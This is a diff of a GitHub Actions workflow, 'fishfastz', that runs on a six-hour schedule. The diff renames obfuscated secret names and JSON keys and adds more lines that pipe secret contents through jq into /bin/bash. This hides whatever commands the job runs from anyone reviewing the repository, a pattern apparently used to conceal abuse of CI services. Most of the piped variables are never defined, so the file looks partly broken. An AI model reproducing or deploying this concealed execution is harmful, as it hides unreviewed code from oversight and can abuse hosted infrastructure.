@@ -1,24 +1,24 @@
 name: fishfastz
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 3/6 * * *'
+    - cron: '14 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fishfastz
         env:
-          yhh0755: ${{ secrets.yhh0755 }}
+          etami594: ${{ secrets.etami594 }}
         run: |
-          echo $yhh0755 | jq -r .zjrz0825 | /bin/bash
-          echo $llrn806 | jq -r .zvec5911 | /bin/bash
-          echo $dbvpl21 | jq -r .mbwnw8230 | /bin/bash
-          echo $m57464 | jq -r .bxn6287 | /bin/bash
-          echo $fcat68224 | jq -r .xmchn06 | /bin/bash
-          echo $uq7165 | jq -r .j864 | /bin/bash
+          echo $etami594 | jq -r .fb4 | /bin/bash
+          echo $fpd3460 | jq -r .rqjul67 | /bin/bash
+          echo $eup52 | jq -r .fl726 | /bin/bash
+          echo $v75 | jq -r .wq17295 | /bin/bash
+          echo $pbb104 | jq -r .y25286 | /bin/bash
+          echo $eyxk1 | jq -r .telz5444 | /bin/bash
+          echo $jstx06834 | jq -r .nza7709 | /bin/bash
+          echo $o394 | jq -r .szw350 | /bin/bash
 
